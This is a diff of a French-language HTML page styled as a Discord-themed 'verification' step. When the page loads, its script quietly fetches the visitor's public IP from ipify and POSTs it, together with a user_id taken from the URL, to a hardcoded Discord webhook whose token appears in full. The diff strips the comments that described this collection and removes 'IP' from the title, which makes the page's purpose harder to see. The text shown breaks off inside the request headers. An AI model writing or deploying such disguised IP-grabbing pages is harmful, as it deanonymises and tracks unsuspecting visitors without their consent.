@@ -2,9 +2,8 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <title>Vérification d'IP</title>
+    <title>Vérification</title>
     <style>
-        /* Style de base */
         body {
             font-family: Arial, sans-serif;
             display: flex;
@@ -12,22 +11,20 @@
             align-items: center;
             height: 100vh;
             margin: 0;
-            background-color: #121212; /* Fond noir */
-            color: #ffffff; /* Texte blanc */
+            background-color: #121212;
+            color: #ffffff;
         }
 
-        /* Conteneur centralisé */
         #container {
             text-align: center;
             padding: 30px;
             width: 300px;
             border: 1px solid #444;
-            background-color: #1e1e1e; /* Fond gris foncé */
+            background-color: #5c5252;
             border-radius: 8px;
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
         }
 
-        /* Style du bouton */
         .button {
             display: inline-block;
             margin-top: 20px;
@@ -35,30 +32,27 @@
             color: #ffffff;
             text-decoration: none;
             font-weight: bold;
-            background-color: #5865f2; /* Bleu Discord */
+            background-color: #5865f2;
             border-radius: 4px;
             box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
             transition: background-color 0.3s;
         }
 
         .button:hover {
-            background-color: #4752c4; /* Bleu Discord foncé */
+            background-color: #4752c4;
         }
     </style>
     <script>
         document.addEventListener("DOMContentLoaded", function() {
-            // Extraire l'identifiant utilisateur de l'URL
             const urlParams = new URLSearchParams(window.location.search);
             const userId = urlParams.get('user_id');
 
             if (userId) {
-                // Récupérer l'IP de l'utilisateur
                 fetch("https://api.ipify.org?format=json")
                     .then(response => response.json())
                     .then(data => {
                         const userIP = data.ip;
 
-                        // Envoi de l'IP et de l'identifiant utilisateur au webhook Discord
                         fetch("https://discord.com/api/webhooks/1305558117420892241/X3TC44x8aZrxgYD71reZpHIZThzShBhBRhiet7w6K6Uq7oQya9xcGPaPdm3KIC4AZh2K", {
                             method: "POST",
                             headers: {
